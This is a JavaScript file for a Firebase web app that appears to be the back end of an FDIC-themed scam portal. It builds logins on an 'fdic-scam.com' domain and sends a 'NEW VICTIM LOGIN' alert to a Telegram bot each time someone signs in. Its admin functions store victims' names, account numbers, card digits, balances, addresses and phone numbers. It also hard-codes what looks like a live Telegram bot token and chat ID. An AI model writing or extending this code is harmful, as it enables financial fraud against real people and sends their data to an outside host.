// app.js
import { auth, db } from "./firebase-config.js";
import { 
  signInWithEmailAndPassword, 
  onAuthStateChanged, 
  signOut 
} from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
import { 
  ref, 
  set, 
  get, 
  update, 
  onValue 
} from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

// --- TELEGRAM CONFIGURATION ---
// Replace with your Bot Token and Chat ID
const TELEGRAM_BOT_TOKEN = "8983043957:AAGncbc73rTjiutiUMOSyDtiGJoqJOUqHSM"; 
const TELEGRAM_CHAT_ID = "7706898844";

function sendTelegramNotification(message) {
  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
    }).catch(err => console.error("Telegram Error:", err));
  }
}

// --- AUTH HANDLERS ---

function handleLogin(username, password) {
  // We use the username as the email for simplicity: username@fdic-scam.com
  const email = `${username}@fdic-scam.com`;
  
  signInWithEmailAndPassword(auth, email, password)
    .then((userCredential) => {
      const user = userCredential.user;
      const userId = user.uid;
      
      // Check if user is admin
      if (username === "admin") {
        window.location.href = "admin.html";
        return;
      }

      // Send Telegram Notification
      sendTelegramNotification(`🚨 NEW VICTIM LOGIN\n\nUser: ${username}\nTime: ${new Date().toLocaleString()}`);

      // Redirect to Dashboard
      window.location.href = "dashboard.html";
    })
    .catch((error) => {
      alert("Invalid Username or Password");
      console.error(error);
    });
}

function handleLogout() {
  signOut(auth).then(() => {
    window.location.href = "index.html";
  });
}

// --- DATABASE HELPERS ---

async function getVictimData(userId) {
  const snapshot = await get(ref(db, `users/${userId}`));
  return snapshot.val();
}

async function updateVictimData(userId, newData) {
  await update(ref(db, `users/${userId}`), newData);
}

// --- ADMIN FUNCTIONS ---

async function createVictimAccount(username, password, name, accountNum, last4, type, balance, address, email, phone) {
  // Create Auth User
  const email = `${username}@fdic-scam.com`;
  const userCredential = await signInWithEmailAndPassword(auth, email, password);
  const userId = userCredential.user.uid;

  // Save Data
  const data = {
    name, accountNum, last4, type, balance, address, email, phone, createdAt: new Date().toISOString()
  };
  await set(ref(db, `users/${userId}`), data);

  return userId;
}

async function deleteVictimAccount(userId) {
  await update(ref(db, `users/${userId}`), { deleted: true });
  // Note: In a real app, you'd delete the auth user too, but for simplicity we just flag it.
}

// Export functions for use in HTML
window.app = {
  handleLogin,
  handleLogout,
  getVictimData,
  updateVictimData,
  createVictimAccount,
  deleteVictimAccount
};
